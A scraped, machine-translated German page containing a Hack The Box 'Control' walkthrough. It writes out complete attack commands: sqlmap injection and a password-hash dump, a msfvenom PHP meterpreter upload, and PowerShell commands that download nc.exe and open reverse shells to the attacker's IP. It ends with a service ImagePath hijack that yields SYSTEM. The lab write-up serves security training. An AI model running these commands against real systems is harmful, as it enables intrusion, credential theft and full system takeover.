<!doctype html>
<html class="no-js" lang="de">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üå§Ô∏è üêÅ ‚úÖ Hack The Box. Durchgangskontrolle. SQL Injection und LPE durch Servicerechte üöñ ‚¨ÖÔ∏è üòå</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Ich ver√∂ffentliche weiterhin L√∂sungen, die zur weiteren Verarbeitung von der HackTheBox- Site gesendet wurden . 
 
 In diesem Artikel dringen wir durc...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Hack The Box. Durchgangskontrolle. SQL Injection und LPE durch Servicerechte</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/499060/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/y_/ag/j1/y_agj1md5zinn0p_o8ucn6nrcfq.png" alt="Bild"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich ver√∂ffentliche weiterhin L√∂sungen, die zur </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">weiteren Verarbeitung</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> von der </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox-</font></a><font style="vertical-align: inherit;"> Site </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">gesendet</font></a><font style="vertical-align: inherit;"> wurden </font><font style="vertical-align: inherit;">. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In diesem Artikel dringen wir durch SQL-Injection in das System ein, vertiefen uns in den Verlauf der Befehlszeile und erh√∂hen unsere Berechtigungen dank der Rechte an dem Dienst. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Verbindung zum Labor erfolgt √ºber VPN. </font><font style="vertical-align: inherit;">Es wird empfohlen, keine Verbindung von einem Arbeitscomputer oder von einem Host aus herzustellen, auf dem die f√ºr Sie wichtigen Daten verf√ºgbar sind, da Sie in ein privates Netzwerk mit Personen gelangen, die etwas auf dem Gebiet der Informationssicherheit wissen :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Organisationsinformationen</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Aufkl√§rung</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dieser Computer hat eine IP-Adresse 10.10.10.167, die ich zu / etc / hosts hinzuf√ºge.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.167    control.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Zuerst scannen wir offene Ports. </font><font style="vertical-align: inherit;">Da das Scannen aller Ports mit nmap sehr lange dauert, werde ich dies zun√§chst mit masscan tun. </font><font style="vertical-align: inherit;">Wir scannen alle TCP- und UDP-Ports von der tun0-Schnittstelle mit einer Geschwindigkeit von 1000 Paketen pro Sekunde.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.167   --rate=1000</code></pre><br>
<img src="https://habrastorage.org/webt/zg/fy/fu/zgfyfurcecpe-cka_lnykhsrcne.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
F√ºr detailliertere Informationen zu den Diensten, die an Ports ausgef√ºhrt werden, f√ºhren wir nun einen Scan mit der Option -A durch.</font></font><br>
<pre><code class="bash hljs">nmap -A control.htb -p80,135,3306,49667,49666</code></pre><br>
<img src="https://habrastorage.org/webt/eo/ql/7a/eoql7aimt9_z47br5j4v_vmfzai.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Auf dem Host wird ein Webserver ausgef√ºhrt. Mal sehen, was da ist. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/jg/gj/eg/jggjeg_agns8gedjluaymnrgmuc.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wir sehen, dass es einen Link zum Admin-Panel gibt. Wir werden jedoch dar√ºber informiert, dass es keinen Header gibt und wir √ºber einen Proxy Kontakt aufnehmen m√ºssen. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ty/qu/zn/tyquznnocwmjntlmqzrfa2exkeq.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Gleichzeitig finden wir im Quellcode der Startseite die Meldung: </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ww/rb/ht/wwrbhtb-ecfdehebmwvxaorailq.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenn </font><font style="vertical-align: inherit;">wir </font><font style="vertical-align: inherit;">vergleichen, was Sie zur Verwendung des Proxys ben√∂tigen, und die gefundene Adresse, gehen wir davon aus, dass Sie diese durchgehen m√ºssen. Der Proxy wird im HTTP-Protokoll im x-forwarded-for-Header angezeigt. Lassen Sie es uns aussetzen. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xt/7v/gz/xt7vgzpnuhaxx7wwxt_t1a8mjgm.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wir gehen erfolgreich zur Admin-Seite. Lassen Sie uns durch den Browser gehen. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/k6/9v/jt/k69vjt9fkb-slnguropll7g4yws.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aber wenn Sie versuchen, etwas zu tun, werfen sie uns auf eine Seite mit einer Proxy-Nachricht. Dies liegt daran, dass wir den gefundenen Header nicht ersetzen. Um dies nicht jedes Mal in Burp Suite zu tun, finden wir auf der Registerkarte Proxy -&gt; Optionen die Funktion ‚ÄûMatch and Replace‚Äú.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ee/bp/jx/eebpjxadru01wuroipptxqtqx-q.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
F√ºgen Sie einen neuen Eintrag hinzu, der diesen Header automatisch allen ausgehenden Anforderungen hinzuf√ºgt. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ts/qi/xp/tsqixpvs8glppx4sw6zrt9byo_k.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Beim Testen des Suchfelds finden wir SQL Injection. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/rl/0n/bn/rl0nbntyfysfaidg_kmx6jrqpk0.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
F√ºr den Betrieb verwenden wir sqlmap. </font><font style="vertical-align: inherit;">Speichern Sie diese Anforderung in einer Datei (In Datei kopieren) und f√ºhren Sie sqlmap aus, wobei Sie diese Datei als Parameter √ºbergeben.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req</code></pre><br>
<img src="https://habrastorage.org/webt/c9/ir/pl/c9irplxxa0exy0byxlfofpmtvk8.png" alt="Bild"><br>
<br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Einstiegspunkt Mal</font></font></b><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
sehen, welche Datenbanken verf√ºgbar sind.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req --dbs</code></pre><br>
<img src="https://habrastorage.org/webt/s_/2z/t_/s_2zt_w40pnldgxyt-cmxmzkvfw.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Lassen Sie uns herausfinden, welche Anmeldeinformationen verf√ºgbar sind. </font><font style="vertical-align: inherit;">Sehen wir uns alle Tabellen in der MySQL-Datenbank an.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql --tables</code></pre><br>
<img src="https://habrastorage.org/webt/ke/-v/je/ke-vje10bm0a0wxqsvtbkloeetu.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir interessieren uns also f√ºr die Benutzertabelle. </font><font style="vertical-align: inherit;">Lassen Sie uns die Namen aller Spalten abrufen.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql -T user --columns</code></pre><br>
<img src="https://habrastorage.org/webt/19/gw/or/19gworxp_r4qy1kxbey7yvbtuko.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Von allen Spalten sind Benutzer und Passwort am interessantesten. </font><font style="vertical-align: inherit;">Wir lernen, was in ihnen ist.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req -D mysql -T user -C User,Password --dump</code></pre><br>
<img src="https://habrastorage.org/webt/e-/76/b4/e-76b4pv25daqhkvxf-zwhqha1g.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Datenbank enth√§lt mehrere Benutzer. </font><font style="vertical-align: inherit;">Sqlmap bietet an, Hashes zu knacken. </font><font style="vertical-align: inherit;">Wir w√§hlen einen W√∂rterbuchangriff aus, geben an, dass wir unser W√∂rterbuch verwenden m√∂chten, und schreiben den Pfad zu rockyou. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/og/fp/us/ogfpusgoxax5y4oby4r4isautx8.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Nach einigen Sekunden erhalten wir eine Tabelle mit Benutzernamen und Hashes ihrer Passw√∂rter. </font><font style="vertical-align: inherit;">Wenn sqlmap das Kennwort knacken konnte, wird es neben dem Hash in Klammern angezeigt. </font><font style="vertical-align: inherit;">Wie Sie sehen k√∂nnen, haben wir die Anmeldeinformationen des Benutzers hector. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/3l/wh/pp/3lwhppkhebq6-zciqhxufbergyg.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ich konnte die Shell nicht mit sqlmap abrufen, sondern Dateien ausschreiben. </font><font style="vertical-align: inherit;">Lassen Sie uns das Web zu Fu√ü gehen. </font><font style="vertical-align: inherit;">Zuerst generieren wir die Meterpreter-Last im PHP-Format.</font></font><br>
<pre><code class="bash hljs">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.15.82 LPORT=4321 -f raw &gt; r.php<font></font>
cat r.php | xclip -selection clipboard &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">'&lt;?php '</span> | tr -d <span class="hljs-string">'\n'</span> &gt; r.php &amp;&amp; xclip -selection clipboard -o &gt;&gt; r.php</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Schreiben Sie es nun mit sqlmap in das Webserververzeichnis.</font></font><br>
<pre><code class="bash hljs">sqlmap -r headers.req --file-write=/home/ralf/tmp/r.php --file-dest=C:/inetpub/wwwroot/r.php</code></pre><br>
<img src="https://habrastorage.org/webt/f-/ov/hr/f-ovhrbjd12vmuczfbltop8nzya.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Die Datei wurde erfolgreich geschrieben. </font><font style="vertical-align: inherit;">F√ºhren Sie den Listener aus. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/n_/8-/ql/n_8-qly45zo-_ihgxv9v54g5fwu.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wenden Sie sich an Ihre Datei auf dem Webserver.</font></font><br>
<pre><code class="bash hljs">curl http://control.htb/r.php</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Im Metasploit-Fenster beobachten wir eine erfolgreiche Verbindung. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/qy/bp/yy/qybpyydcw15sv7zk5borirt75jc.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Gehen Sie zu dieser Sitzung. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ah/fu/3f/ahfu3f12oacub1nb_pbc4nu0flg.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aber hier ist das Problem, wir k√∂nnen keine Befehle √ºber die Shell ausf√ºhren. Au√üerdem setzen solche Versuche die Verbindung zur√ºck. </font><font style="vertical-align: inherit;">Versuchen wir, die Sperre zu umgehen, indem wir einen Powershell-Prozess im interaktiven Modus (-i) erstellen, der nicht sichtbar ist (-H), und unseren Befehl als Parameter (-a) √ºbergeben. </font><font style="vertical-align: inherit;">Lassen Sie uns herausfinden, unter welchem ‚Äã‚ÄãBenutzer wir arbeiten.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/tg/c1/ph/tgc1photow2juvshqy_imh2wop0.png" alt="Bild"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BENUTZER</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir haben Hector-Anmeldeinformationen. Wir werden herausfinden, ob sich ein solcher Benutzer im System befindet. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/4r/tw/9h/4rtw9hec22vofi3vvcjfn2bgqza.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Es gibt so einen Benutzer! </font><font style="vertical-align: inherit;">Aber zuerst den Namen des Autos herausfinden. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/_0/q1/yd/_0q1ydmzwb0jg10dxhfcd5gdszm.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wir haben Benutzername, Passwort, Domain und Computername. </font><font style="vertical-align: inherit;">Lassen Sie uns nun pr√ºfen, ob die erhaltenen Anmeldeinformationen geeignet sind. </font><font style="vertical-align: inherit;">F√ºhren Sie dazu im Auftrag von Hector ‚Äûwhoami‚Äú aus.</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { whoami }"</span> -i -H</code></pre><br>
<img src="https://habrastorage.org/webt/f7/zv/gz/f7zvgzzrv5rymzoknsodblm8qqw.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Fein. </font><font style="vertical-align: inherit;">Lassen Sie uns die Shell bekommen. </font><font style="vertical-align: inherit;">F√ºhren Sie den Webserver auf dem lokalen Host aus.</font></font><br>
<pre><code class="bash hljs">python3 -m http.server 80</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und auf den Remote-Netcat-Host hochladen.</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { iwr 10.10.15.82/nc.exe -o C:\\Users\\Hector\\Documents\\nc.exe }"</span> -i -H</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√ñffnen Sie nun den 5432-Port. </font><font style="vertical-align: inherit;">nc -lvp 5432 und stellen Sie die umgekehrte Verbindung vom Remote-Host her.</font></font><br>
<pre><code class="bash hljs">execute -f powershell -a <span class="hljs-string">"<span class="hljs-variable">$username</span> = 'Control\Hector' ; <span class="hljs-variable">$password</span> = 'l33th4x0rhector' ; <span class="hljs-variable">$securePassword</span> = ConvertTo-SecureString <span class="hljs-variable">$password</span> -AsPlainText -Force ; <span class="hljs-variable">$credential</span> = New-Object System.Management.Automation.PSCredential <span class="hljs-variable">$username</span>, <span class="hljs-variable">$securePassword</span> ; Invoke-command -computername Fidelity -credential <span class="hljs-variable">$credential</span> -scriptblock { C:\\Users\\Hector\\Documents\\nc.exe -e powershell 10.10.15.82 5432 }"</span> -i -H</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Also nehmen wir den Benutzer.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/z6/wu/-v/z6wu-vdgfchbqaobjsq83pdpdpe.png" alt="Bild"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WURZEL</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenn wir versuchen, eine der </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Methoden zum</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Sammeln von Informationen vom Host auf den Host hochzuladen (z. B. </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">BloodHound</font></a><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerUp</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">JAWS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WinPEAS</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ), stellen wir fest, dass der Verteidiger diese entfernt. </font><font style="vertical-align: inherit;">WinPEAS hat jedoch eine </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bat-Version</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , die nicht deinstalliert werden kann. </font><font style="vertical-align: inherit;">Wir laden es auf den Host hoch und f√ºhren es aus. </font><font style="vertical-align: inherit;">Dar√ºber hinaus ist es nur erforderlich, die gesammelten Informationen sorgf√§ltig zu √ºberpr√ºfen. </font><font style="vertical-align: inherit;">Und wir finden eine interessante Datei ConsoleHost_history.txt. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/k3/oe/z4/k3oez4vknoc6njwzz0tvs_wav8i.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Schauen Sie, was sie enth√§lt.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wy/pr/av/wypravr1cr2pa2im8on8yl34rew.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Diese Teams sind das einzige, was wir haben. </font><font style="vertical-align: inherit;">Das Cmdlet Get-Acl ruft Objekte ab, die eine Sicherheitsbeschreibung f√ºr eine Datei oder Ressource darstellen. </font><font style="vertical-align: inherit;">Die Sicherheitsbeschreibung enth√§lt ACLs (Resource Access Control Lists). </font><font style="vertical-align: inherit;">Die ACL enth√§lt die Berechtigungen, die Benutzer und Benutzergruppen f√ºr den Zugriff auf die Ressource ben√∂tigen. </font><font style="vertical-align: inherit;">Daher habe ich beschlossen, dass der L√∂sungspfad in den Diensten und dem Zugriff auf diese liegt. </font><font style="vertical-align: inherit;">Lassen Sie uns alle Dienste und Berechtigungen von Hector f√ºr sie erhalten.</font></font><br>
<br>
<pre><code class="bash hljs">get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i <span class="hljs-string">"Hector Users Path"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Wenn wir uns die Ausgabe ansehen, stellen wir fest, dass Hector die vollen Rechte f√ºr den Windows-Update-Dienst wuauserv hat. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sp/je/pk/spjepkdg3e1zsisqo8vhvz_1gmk.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dienste im Windows-Betriebssystem werden mit Systemberechtigungen ausgef√ºhrt. </font><font style="vertical-align: inherit;">Bei der Registrierung eines Dienstes im System wird der Pfad zur ausf√ºhrbaren Dienstdatei im ImagePath-Attribut gesch√ºtzt. </font><font style="vertical-align: inherit;">Lassen Sie uns den Wert dieses Attributs √§ndern und die Shell laden.</font></font><br>
<pre><code class="bash hljs">reg add <span class="hljs-string">"HKLM\System\CurrentControlSet\Services\wuauserv"</span> /v ImagePath /t REG_SZ /d <span class="hljs-string">"C:\Users\Hector\Documents\nc.exe -e powershell 10.10.15.82 6543"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Starten Sie nun den Update-Service.</font></font><br>
<pre><code class="bash hljs">start-service wuauserv</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Und wir bekommen eine Shell mit maximalen Privilegien. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/im/w1/tq/imw1tqnkohjh-qs-nvwbuggywoy.png" alt="Bild"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sie k√∂nnen sich uns </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">per Telegramm anschlie√üen</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Dort finden Sie interessante Materialien, zusammengef√ºhrte Kurse sowie Software. </font><font style="vertical-align: inherit;">Stellen wir eine Community zusammen, in der es Menschen gibt, die sich in vielen Bereichen der IT auskennen. Dann k√∂nnen wir uns in Fragen der IT und der Informationssicherheit immer gegenseitig helfen.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../de499048/index.html">Sol Levante: Wie sie Anime in 4K und HDR f√ºr Netflix gemacht haben</a></li>
<li><a href="../de499052/index.html">Externer Datenspeicher: von IBM 1311 bis heute. Teil 2</a></li>
<li><a href="../de499054/index.html">F√ºhrer an einem neuen Ort: √úberlebensanweisung</a></li>
<li><a href="../de499056/index.html">Wie Amazon organisiert ist</a></li>
<li><a href="../de499058/index.html">Wer besch√§ftigt sich mit Deep Audio und warum wird es ben√∂tigt</a></li>
<li><a href="../de499062/index.html">Kleine physikalische Probleme</a></li>
<li><a href="../de499064/index.html">Alternatives Kontextverst√§ndnis unter Verwendung eines statistischen Sprachmodells</a></li>
<li><a href="../de499068/index.html">Definieren von Punktwolken-Transformationsparametern</a></li>
<li><a href="../de499070/index.html">–ü–®–ï AndroidStudio oder die volle Nutzung der VCS-Tools</a></li>
<li><a href="../de499086/index.html">Dask Home Cluster</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>